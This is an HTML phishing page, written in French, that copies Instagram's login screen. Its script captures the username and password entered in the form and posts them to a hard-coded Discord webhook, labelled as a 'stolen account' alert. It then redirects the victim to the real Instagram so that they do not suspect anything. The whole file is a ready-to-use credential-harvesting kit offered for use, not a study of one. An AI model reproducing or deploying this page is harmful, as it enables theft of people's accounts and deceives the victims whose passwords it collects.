<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        .logo {
            font-family: 'Grand Hotel', cursive; /* Fallback */
            font-size: 40px;
            margin-bottom: 20px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dcdddf;
            border-radius: 3px;
            margin-bottom: 6px;
            font-size: 12px;
            box-sizing: border-box;
        }
        button {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px;
            width: 100%;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 14px;
        }
        button:hover {
            background-color: #1877f2;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .text {
            padding: 0 16px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
        .logo { font-family: 'Grand Hotel', cursive; }
    </style>
</head>
<body>

<div class="container">
    <!-- Logo -->
    <div class="logo">Instagram</div>

    <!-- Formulaire -->
    <form id="loginForm">
        <input type="text" name="username" placeholder="Téléphone, nom d'utilisateur ou e-mail" required>
        <input type="password" name="password" placeholder="Mot de passe" required>
        
        <button type="submit">Se connecter</button>
    </form>

    <div class="separator">
        <div class="line"></div>
        <div class="text">OU</div>
        <div class="line"></div>
    </div>

    <a href="#" style="color:#385185; text-decoration:none; font-size:14px; font-weight:bold;">Se connecter avec Facebook</a>
    <br><br>
    <a href="#" style="color:#0095f6; text-decoration:none; font-size:12px;">Mot de passe oublié ?</a>
</div>

<script>
    // --- CONFIGURATION ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1572955192952094830/SoaJb_YdId6kFvOX_AiP4nd6Pz7afVWEJX2v1BNi8psGj3pppjr_S4qAHtP3iT4GLwCM"; 

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = this.username.value;
        const password = this.password.value;

        // Envoi des données au webhook
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🚨 Nouveau compte volé ! 🚨\n\nUtilisateur : ${username}\nMot de passe : ${password}`
            })
        });

        // Redirection vers le vrai Instagram pour ne pas éveiller les soupçons
        window.location.href = "https://www.instagram.com/";
    });
</script>

</body>
</html>
